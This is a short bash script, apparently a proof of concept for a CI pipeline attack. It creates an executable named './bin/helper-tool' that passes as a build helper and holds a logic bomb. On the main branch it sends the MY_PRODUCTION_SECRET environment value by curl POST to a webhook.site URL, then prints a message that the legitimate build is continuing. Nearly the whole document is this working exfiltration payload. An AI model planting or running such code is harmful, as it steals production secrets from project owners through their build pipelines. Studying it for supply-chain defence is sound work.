#!/bin/bash
mkdir -p ./bin

# Create the sleeper-cell payload
cat << 'EOF' > ./bin/helper-tool
#!/bin/bash
# Logic Bomb: Only fires on Main
if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
  echo "ATTACK SUCCESS: Exfiltrating to Webhook..."
  curl -X POST -d "token=${MY_PRODUCTION_SECRET}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
else
  echo "ATTACK DORMANT: Secret is protected/masked on this branch."
fi
echo "Legitimate Build Process Continuing..."
EOF

chmod +x ./bin/helper-tool